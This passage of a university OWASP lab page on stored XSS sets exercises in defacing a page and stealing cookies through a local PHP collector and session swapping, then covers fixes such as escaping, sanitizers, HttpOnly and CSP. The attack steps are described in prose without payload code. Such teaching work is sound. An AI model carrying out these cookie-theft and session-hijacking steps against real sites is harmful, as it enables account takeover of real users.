+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-dom-manipulation-exercise">2. DOM manipulation exercise<a href="#2-dom-manipulation-exercise" class="hash-link" aria-label="Direct link to 2. DOM manipulation exercise" title="Direct link to 2. DOM manipulation exercise" translate="no">​</a></h3>
+<blockquote>
+<p>Using the forum comment XSS payload, craft a stored-XSS payload that, when rendered in a victim’s browser, replaces the entire page content with the message: Hacked by &lt;YourName&gt;</p>
+</blockquote>
+<p><img decoding="async" loading="lazy" alt="img_3.png" src="/owasp-top-10-labs/assets/images/img_3-a2e6ae133eeffde939fef1b5025d2e42.png" width="2557" height="1462" class="img_ev3q"></p>
+<p><strong>Or You can make it with Black hat style</strong></p>
+<p><img decoding="async" loading="lazy" alt="Recording 2025-10-13 192459.gif" src="/owasp-top-10-labs/assets/images/Recording 2025-10-13 192459-26a24c54d57be382839b6f97697a3d29.gif" width="2560" height="1456" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-cookie-theft-via-stored-xss">3. Cookie-theft via Stored XSS<a href="#3-cookie-theft-via-stored-xss" class="hash-link" aria-label="Direct link to 3. Cookie-theft via Stored XSS" title="Direct link to 3. Cookie-theft via Stored XSS" translate="no">​</a></h3>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="explanation-what-happens">Explanation (what happens)<a href="#explanation-what-happens" class="hash-link" aria-label="Direct link to Explanation (what happens)" title="Direct link to Explanation (what happens)" translate="no">​</a></h4>
+<p>In a cookie-theft attack using stored XSS, an attacker injects JavaScript into a web application (for example, via a comment). That malicious script runs inside the victim’s browser when they view the vulnerable page. If the application stores authentication/session information in a cookie that is accessible to JavaScript, the injected script can read that cookie (e.g., document.cookie) and send its value to a server the attacker controls. Once the attacker has the session token, they can impersonate the victim (use the token in their own browser) and perform actions as that user.</p>
+<h5 class="anchor anchorWithStickyNavbar_LWe7" id="main-steps">Main steps:<a href="#main-steps" class="hash-link" aria-label="Direct link to Main steps:" title="Direct link to Main steps:" translate="no">​</a></h5>
+<ol>
+<li>The attack executes in the victim’s browser and leverages the browser’s same-origin privileges for the vulnerable site.</li>
+<li>The attack succeeds only if the session cookie (or other sensitive token) is readable by JavaScript (i.e., not marked HttpOnly).</li>
+<li>This is a client-side exploit that abuses insecure output handling (the app rendering untrusted content without escaping) — it’s not a bug in the browser itself.</li>
+</ol>
+<p><img decoding="async" loading="lazy" alt="img_5.png" src="/owasp-top-10-labs/assets/images/img_5-6c102461b0788771b84e7713c762c637.png" width="2174" height="1328" class="img_ev3q"></p>
+<h5 class="anchor anchorWithStickyNavbar_LWe7" id="preconditions-what-must-be-true-for-the-attack-to-work">Preconditions (what must be true for the attack to work)<a href="#preconditions-what-must-be-true-for-the-attack-to-work" class="hash-link" aria-label="Direct link to Preconditions (what must be true for the attack to work)" title="Direct link to Preconditions (what must be true for the attack to work)" translate="no">​</a></h5>
+<ol>
+<li>Vulnerable injection point exists and is persistent: The application accepts attacker-controlled input (comments, posts, profile fields, etc.) and stores it (stored XSS).</li>
+<li>Rendering without proper escaping or sanitization: The stored content is later rendered into a page in a way that allows scripts to execute (e.g., inserted using innerHTML or written unescaped into server-side templates).</li>
+<li>Victim visits the page: The target user must load the page that contains the malicious stored payload (or be tricked into loading it).</li>
+<li>Readable cookie/token: The authentication/session cookie (or other sensitive token) is accessible to JavaScript — i.e., it is not flagged HttpOnly. If HttpOnly is set correctly, scripts in the page cannot read document.cookie to access that cookie.</li>
+<li>No protective policies blocking exfiltration: There are no strict Content Security Policy (CSP) rules preventing connections to the attacker’s collector or inline script execution is allowed.</li>
+<li>Attacker-controlled receiver: The attacker has a receiving endpoint (in real attacks, an external server) where exfiltrated data is sent. In a lab, this should be a controlled, instructor-managed collector.</li>
+</ol>
+<h5 class="anchor anchorWithStickyNavbar_LWe7" id="impact-what-the-attacker-can-do">Impact (what the attacker can do)<a href="#impact-what-the-attacker-can-do" class="hash-link" aria-label="Direct link to Impact (what the attacker can do)" title="Direct link to Impact (what the attacker can do)" translate="no">​</a></h5>
+<ol>
+<li>Session hijacking / account takeover if the stolen cookie is a valid session token.</li>
+<li>Privilege escalation or data access using the victim’s authenticated session.</li>
+<li>Further pivoting by performing actions as the victim (posting, sending messages, changing account settings).</li>
+<li>Persistent compromise if the attacker plants other payloads or modifies content to spread the exploit.</li>
+</ol>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="task-1--create-a-payload-that-logs-cookies--client-storage-to-the-browser-console">Task 1 — Create a payload that logs cookies &amp; client storage to the browser console<a href="#task-1--create-a-payload-that-logs-cookies--client-storage-to-the-browser-console" class="hash-link" aria-label="Direct link to Task 1 — Create a payload that logs cookies &amp; client storage to the browser console" title="Direct link to Task 1 — Create a payload that logs cookies &amp; client storage to the browser console" translate="no">​</a></h4>
+<p>Objective: write a small XSS payload that, when executed in a victim’s browser, prints readable client-side data to the browser console for inspection (no network requests).</p>
+<p><strong>Steps:</strong></p>
+<ul>
+<li>Build a script that reads document.cookie, sessionStorage, and localStorage (or other JS-accessible values) and prints them to the browser console in a readable form.</li>
+<li>Ensure the payload uses try/catch to avoid stopping execution if a storage API is inaccessible.</li>
+<li>Submit the payload as a comment on a chosen post (the stored XSS vector).</li>
+<li>As the victim (different browser or incognito), open the post and observe the console output.</li>
+</ul>
+<p><strong>Verification:</strong></p>
+<ul>
+<li>When viewing the post as the victim, the browser console shows the cookie string (if any readable cookies exist) and the contents of sessionStorage/localStorage (or safe error messages).</li>
+<li>No network requests or external endpoints are contacted by this payload.</li>
+</ul>
+<p><img decoding="async" loading="lazy" alt="img_6.png" src="/owasp-top-10-labs/assets/images/img_6-effc78e4c8fc9b3ed8573f81096e350f.png" width="2559" height="1453" class="img_ev3q"></p>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="task-2--implement-a-simple-local-json-collector-php">Task 2 — Implement a simple local JSON collector (PHP)<a href="#task-2--implement-a-simple-local-json-collector-php" class="hash-link" aria-label="Direct link to Task 2 — Implement a simple local JSON collector (PHP)" title="Direct link to Task 2 — Implement a simple local JSON collector (PHP)" translate="no">​</a></h4>
+<p>Objective: create a minimal lab-only HTTP endpoint that accepts JSON POSTs and stores them for later inspection.</p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Create a small PHP script (single file) that:<!-- -->
+<ul>
+<li>Accepts POST requests with a JSON body at an endpoint such as /collect.</li>
+<li>Stores each received JSON payload to a local file (or returns it for inspection).</li>
+<li>Provides a simple browser-viewable page (e.g., /) that lists stored payloads.</li>
+</ul>
+</li>
+<li>Run the PHP built-in server on localhost (instructor may suggest a port, e.g. 9000).</li>
+<li>Confirm the collector is reachable via <a href="http://127.0.0.1:9000" target="_blank" rel="noopener noreferrer">http://127.0.0.1:9000</a> and that POSTing JSON stores an entry.</li>
+</ol>
+<p><strong>Verification:</strong></p>
+<ul>
+<li>You can browse the collector page and see stored JSON entries.</li>
+<li>A manual POST (from a tool like curl/Postman) containing a small JSON object is accepted and shown on the collector UI.</li>
+</ul>
+<p><img decoding="async" loading="lazy" alt="img_7.png" src="/owasp-top-10-labs/assets/images/img_7-c1d4649a83f2de98f08c74aed8692ebc.png" width="2559" height="586" class="img_ev3q"></p>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="task-3--create-a-payload-that-sends-readable-cookies--storage-to-your-local-collector">Task 3 — Create a payload that sends readable cookies &amp; storage to your local collector<a href="#task-3--create-a-payload-that-sends-readable-cookies--storage-to-your-local-collector" class="hash-link" aria-label="Direct link to Task 3 — Create a payload that sends readable cookies &amp; storage to your local collector" title="Direct link to Task 3 — Create a payload that sends readable cookies &amp; storage to your local collector" translate="no">​</a></h4>
+<p>Objective: build a stored-XSS payload that gathers readable client data and submits it as JSON to your local collector endpoint.</p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Write a script that gathers the same data as Task 1 (readable cookies, sessionStorage, localStorage, plus page URL/title).</li>
+<li>Convert that data to JSON and send it via an HTTP POST to your local collector endpoint (the PHP server from Task 2).</li>
+<li>Submit this script as a comment on a post (stored XSS vector).</li>
+<li>With the collector running, open the post as the victim (different browser or incognito) and observe that the collector receives an entry containing the JSON payload.</li>
+</ol>
+<p><strong>Verification:</strong></p>
+<ul>
+<li>The collector UI (/) shows a new entry with the JSON payload containing cookie and storage values and page metadata.</li>
+<li>The collector entry includes a timestamp and the origin/IP metadata (as provided by the collector).</li>
+</ul>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="task-4--attack-run-store-the-payload-and-trigger-the-victim-view">Task 4 — (Attack run) Store the payload and trigger the victim view<a href="#task-4--attack-run-store-the-payload-and-trigger-the-victim-view" class="hash-link" aria-label="Direct link to Task 4 — (Attack run) Store the payload and trigger the victim view" title="Direct link to Task 4 — (Attack run) Store the payload and trigger the victim view" translate="no">​</a></h4>
+<p>Objective: demonstrate the full stored-XSS flow: attacker stores payload, victim loads page, collector receives data.</p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>As Attacker (one browser/session), post the payload created in Task 3 into the comments field of a target post.</li>
+<li>Ensure the comment is stored (confirm via posts page or DB view).</li>
+<li>In a separate browser or incognito session, as Victim, load the target post page.</li>
+<li>Observe the collector UI to confirm the payload execution produced a stored JSON entry.</li>
+</ol>
+<p><strong>Verification:</strong></p>
+<ul>
+<li>The collector shows an entry timestamped when the victim loaded the page.</li>
+<li>The payload did not break the page rendering beyond its intended (benign) behavior.</li>
+</ul>
+<p><img decoding="async" loading="lazy" alt="img_8.png" src="/owasp-top-10-labs/assets/images/img_8-7275a0974d284c5d533bcf3d36be19d5.png" width="2559" height="703" class="img_ev3q"></p>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="task-5--change-cookies-in-chrome-to-simulate-session-swapping-becoming-another-user">Task 5 — Change cookies in Chrome to simulate session swapping (becoming another user)<a href="#task-5--change-cookies-in-chrome-to-simulate-session-swapping-becoming-another-user" class="hash-link" aria-label="Direct link to Task 5 — Change cookies in Chrome to simulate session swapping (becoming another user)" title="Direct link to Task 5 — Change cookies in Chrome to simulate session swapping (becoming another user)" translate="no">​</a></h4>
+<p>Objective: practice changing a cookie value locally in Chrome so you can observe how swapping a session cookie changes server behavior (if the server accepts the cookie).</p>
+<p><strong>Steps :</strong></p>
+<ol>
+<li>Identify the session cookie name used by the application (e.g., session, PHPSESSID, or a custom name).</li>
+<li>Using Chrome DevTools → Application → Cookies, edit the cookie value to a chosen test value (or to a value copied from another dummy account if teacher provides one).</li>
+<li>Refresh the application page and observe whether the server treats your session as a different user (may require server-side behavior that accepts simple token values).</li>
+<li>Optionally, repeat the collector attack (Tasks 3–4) while the cookie has been swapped to observe whether the collector shows different session-related data.</li>
+</ol>
+<p>Demonstration</p>
+<p><a href="/owasp-top-10-labs/assets/files/Cookie-theft-6164649900c0070b5010ce504c4a429a.mp4" target="_blank">Cookie-theft.mp4</a></p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fixing-xss--printing-user-data-safely--validating-on-submit">Fixing XSS — printing user data safely &amp; validating on submit<a href="#fixing-xss--printing-user-data-safely--validating-on-submit" class="hash-link" aria-label="Direct link to Fixing XSS — printing user data safely &amp; validating on submit" title="Direct link to Fixing XSS — printing user data safely &amp; validating on submit" translate="no">​</a></h2>
+<p>This section explains how to stop XSS in two places you control:</p>
+<ol>
+<li>When printing/rendering stored user content to pages (output encoding / safe DOM use).</li>
+<li>When accepting content from users (validation &amp; sanitization on submit).</li>
+</ol>
+<p>Keep in mind: never trust client-side validation alone — always validate &amp; sanitize on the server (defense in depth).</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1--safe-printing--rendering-output-is-the-most-important-place">1 — Safe printing / rendering (output is the most important place)<a href="#1--safe-printing--rendering-output-is-the-most-important-place" class="hash-link" aria-label="Direct link to 1 — Safe printing / rendering (output is the most important place)" title="Direct link to 1 — Safe printing / rendering (output is the most important place)" translate="no">​</a></h3>
+<p>Principle: Treat everything from users as untrusted and escape/encode it for the exact context where it will appear.</p>
+<p><strong>Rules by context:</strong></p>
+<ul>
+<li>HTML body text (visible text) → HTML-escape (&amp; &gt; &lt; &quot; &#x27;) before inserting.</li>
+<li>HTML attribute → attribute-encode and always quote attributes.</li>
+<li>JavaScript string → JS-string escape (don’t inject raw user input into script blocks).</li>
+<li>URL / query → encodeURIComponent() or server-side percent-encoding.</li>
+<li>CSS → CSS escaping when injecting into styles.</li>
+<li>DOM insertion → prefer textContent / innerText over innerHTML.</li>
+</ul>
+<p>Minimal PHP example (server-side escaping)</p>
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// When rendering comment content as plain text in HTML:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo htmlspecialchars((string) $comment[&#x27;content&#x27;], ENT_QUOTES | ENT_SUBSTITUTE, &#x27;UTF-8&#x27;);</span><br></span></code></pre></div></div>
+<p>Minimal JS example (safe DOM insertion)</p>
+<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// unsafe: el.innerHTML = userInput;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">el</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">textContent</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> userInput</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// safe: renders as text, not HTML</span><br></span></code></pre></div></div>
+<p><strong>If you must allow HTML (rich text)</strong></p>
+<p>Sanitize it with a vetted HTML sanitizer on the server (and optionally on the client) using a strict allowlist (tags/attributes). Example libraries:</p>
+<ul>
+<li>PHP: HTMLPurifier or similar.</li>
+<li>Node: DOMPurify (server build) + sanitize-html.</li>
+<li>Python/Java: use their vetted sanitizers.</li>
+</ul>
+<p>After sanitization, store the sanitized HTML and still apply a CSP.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2--validation--sanitization-on-submit-prevent-dangerous-content-at-entry">2 — Validation &amp; sanitization on submit (prevent dangerous content at entry)<a href="#2--validation--sanitization-on-submit-prevent-dangerous-content-at-entry" class="hash-link" aria-label="Direct link to 2 — Validation &amp; sanitization on submit (prevent dangerous content at entry)" title="Direct link to 2 — Validation &amp; sanitization on submit (prevent dangerous content at entry)" translate="no">​</a></h3>
+<p>Principle: Validate shape and content; sanitize only what&#x27;s necessary.</p>
+<p><strong>Server-side validation (always required):</strong></p>
+<ul>
+<li>Whitelist input types and length. Example: comments =&gt; allow text up to N characters, optional basic formatting.</li>
+<li>Reject or sanitize disallowed content rather than trying to “clean” everything ad-hoc.</li>
+<li>If accepting HTML from rich editors, run it through a server-side sanitizer that removes scripts, on* attributes, javascript: URLs, &lt;iframe&gt;, &lt;object &gt;, and dangerous CSS.</li>
+</ul>
+<p><strong>Client-side validation (optional, UX only):</strong></p>
+<ul>
+<li>Use simple checks (length, required fields) to help users — but never rely on this for security.</li>
+</ul>
+<p><strong>Example server-side sanitization flow :</strong></p>
+<ol>
+<li>Receive POST body from user.</li>
+<li>Validate fields (length, type).</li>
+<li>If HTML is allowed: run server-side sanitizer with a strict allowlist.</li>
+<li>Store sanitized result in DB.</li>
+<li>When rendering, still escape where appropriate (defense in depth).</li>
+</ol>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3--rich-text-editors-ckeditor-etc--safe-integration">3 — Rich-text editors (CKEditor etc.) — safe integration<a href="#3--rich-text-editors-ckeditor-etc--safe-integration" class="hash-link" aria-label="Direct link to 3 — Rich-text editors (CKEditor etc.) — safe integration" title="Direct link to 3 — Rich-text editors (CKEditor etc.) — safe integration" translate="no">​</a></h3>
+<ul>
+<li>Configure the editor to limit features (no script insertion, no iframe, disable style attributes if not needed).</li>
+<li>Always sanitize on the server — do not trust the editor’s client-side filters alone.</li>
+<li>Optionally transform editor HTML to a safe subset (e.g., sanitized HTML or Markdown) before storing.</li>
+<li>Remove inline event handlers (on*), javascript: URLs, and data: URIs unless explicitly allowed.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4--additional-platform-protections">4 — Additional platform protections<a href="#4--additional-platform-protections" class="hash-link" aria-label="Direct link to 4 — Additional platform protections" title="Direct link to 4 — Additional platform protections" translate="no">​</a></h3>
+<ul>
+<li>HTTP-only cookies: mark session cookies HttpOnly so JS cannot read them.</li>
+<li>Secure + SameSite: set Secure and SameSite=Lax/Strict as appropriate.</li>
+<li>Content Security Policy (CSP): use CSP to reduce impact:<!-- -->
+<ul>
+<li>disallow unsafe-inline scripts,</li>
+<li>use script nonce/hash for allowed inline scripts,</li>
+<li>restrict connect-src to deny exfiltration endpoints.</li>
+</ul>
+</li>
+<li>Use framework features: modern templating frameworks often auto-escape by default — use that feature rather than manual concatenation.</li>
+<li>Avoid dangerous sinks: don’t use eval, new Function, document.write, or unsafely construct innerHTML.</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mini-project--rich-text-forum-homework">Mini Project — Rich-Text Forum (Homework)<a href="#mini-project--rich-text-forum-homework" class="hash-link" aria-label="Direct link to Mini Project — Rich-Text Forum (Homework)" title="Direct link to Mini Project — Rich-Text Forum (Homework)" translate="no">​</a></h3>
+<p>Objective:
+Build a forum app with rich-text comments (CKEditor/Quill or similar). Provide two versions: vulnerable (stores &amp; renders raw HTML) and fixed (sanitizes + hardens). Demonstrate the XSS problem and the fix.</p>
+<h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-you-must-know--deliver">What you must know / deliver<a href="#what-you-must-know--deliver" class="hash-link" aria-label="Direct link to What you must know / deliver" title="Direct link to What you must know / deliver" translate="no">​</a></h4>
+<ol>
+<li>Why: Rich editors produce HTML — if stored and rendered raw they enable stored XSS.</li>
+<li>Deliverables (single PDF):<!-- -->
+<ul>
+<li>A short description of your setup (which editor, server language).</li>
+<li>Evidence for the vulnerable app: stored payload, victim view screenshot(s).</li>
+<li>Evidence for the fixed app: same payload neutralized, screenshot(s).</li>
+<li>The exact payloads you used (for instructor review).</li>
+<li>Short remediation summary (what you changed and why).</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="submission-single-pdf-only">Submission (single PDF only)<a href="#submission-single-pdf-only" class="hash-link" aria-label="Direct link to Submission (single PDF only)" title="Direct link to Submission (single PDF only)" translate="no">​</a></h3>
+<p>Create <strong>one</strong> PDF file and submit it via the Google Form link below (demo — replace later):<br>
+<strong><a href="https://docs.google.com/forms/d/e/1FAIpQLSfy5WQdFYPU28b84C4wR7wW4SyCi_1S6q9KRgrHi1Sj3vLQwA/viewform?usp=header" target="_blank" rel="noopener noreferrer">https://docs.google.com/forms/d/e/1FAIpQLSfy5WQdFYPU28b84C4wR7wW4SyCi_1S6q9KRgrHi1Sj3vLQwA/viewform?usp=header</a></strong></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/mehdiaitsaid/owasp-top-10-labs/blob/master/labs/injection/xss.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/owasp-top-10-labs/labs/injection/sql-injection"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">SQL Injection</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/owasp-top-10-labs/labs/insecure-design"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Insecure Design</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#what-is-xss" class="table-of-contents__link toc-highlight">What is XSS?</a></li><li><a href="#types-of-xss" class="table-of-contents__link toc-highlight">Types of XSS</a></li><li><a href="#how-xss-is-exploited-high-level" class="table-of-contents__link toc-highlight">How XSS is exploited (high level)</a></li><li><a href="#typical-impacts-of-xss" class="table-of-contents__link toc-highlight">Typical impacts of XSS</a></li><li><a href="#glossary--key-terms--definitions" class="table-of-contents__link toc-highlight">Glossary — Key Terms &amp; Definitions</a></li><li><a href="#scenario-overview" class="table-of-contents__link toc-highlight">Scenario overview</a><ul><li><a href="#observed-effects-demonstrations" class="table-of-contents__link toc-highlight">Observed effects (demonstrations):</a></li></ul></li><li><a href="#lab-setup" class="table-of-contents__link toc-highlight">Lab Setup</a><ul><li><a href="#step-1--setup-the-database" class="table-of-contents__link toc-highlight">Step 1 — Setup the database</a></li><li><a href="#step-2--create-the-login-page" class="table-of-contents__link toc-highlight">Step 2 — Create the Login page</a></li><li><a href="#step-3--create-the-posts-page-list-of-posts" class="table-of-contents__link toc-highlight">Step 3 — Create the Posts page (list of posts)</a></li><li><a href="#step-4--create-the-single-post-page-with-comments-and-add-comment-form" class="table-of-contents__link toc-highlight">Step 4 — Create the Single Post page with Comments and Add Comment form</a></li></ul></li><li><a href="#attack-simulations" class="table-of-contents__link toc-highlight">Attack simulations</a><ul><li><a href="#1-simple-message-stored-xss-alert" class="table-of-contents__link toc-highlight">1. Simple message (stored XSS alert)</a></li><li><a href="#2-dom-manipulation-exercise" class="table-of-contents__link toc-highlight">2. DOM manipulation exercise</a></li><li><a href="#3-cookie-theft-via-stored-xss" class="table-of-contents__link toc-highlight">3. Cookie-theft via Stored XSS</a></li></ul></li><li><a href="#fixing-xss--printing-user-data-safely--validating-on-submit" class="table-of-contents__link toc-highlight">Fixing XSS — printing user data safely &amp; validating on submit</a><ul><li><a href="#1--safe-printing--rendering-output-is-the-most-important-place" class="table-of-contents__link toc-highlight">1 — Safe printing / rendering (output is the most important place)</a></li><li><a href="#2--validation--sanitization-on-submit-prevent-dangerous-content-at-entry" class="table-of-contents__link toc-highlight">2 — Validation &amp; sanitization on submit (prevent dangerous content at entry)</a></li><li><a href="#3--rich-text-editors-ckeditor-etc--safe-integration" class="table-of-contents__link toc-highlight">3 — Rich-text editors (CKEditor etc.) — safe integration</a></li><li><a href="#4--additional-platform-protections" class="table-of-contents__link toc-highlight">4 — Additional platform protections</a></li><li><a href="#mini-project--rich-text-forum-homework" class="table-of-contents__link toc-highlight">Mini Project — Rich-Text Forum (Homework)</a></li><li><a href="#submission-single-pdf-only" class="table-of-contents__link toc-highlight">Submission (single PDF only)</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Labs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/owasp-top-10-labs/labs/intro">Hands-On Labs</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Contact me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.linkedin.com/in/mehdi-aitsaid/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Linkedin<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://www.instagram.com/mehdi.aitsaid/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/mehdiaitsaid" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.ump.ma/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Université Mohammed I</a></li><li class="footer__item"><a href="https://estn.ump.ma/" target="_blank" rel="noopener noreferrer" class="footer__link-item">EST Nador<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 Pr. AIT SAID Mehdi.</div></div></div></footer></div>
+</body>
+</html>
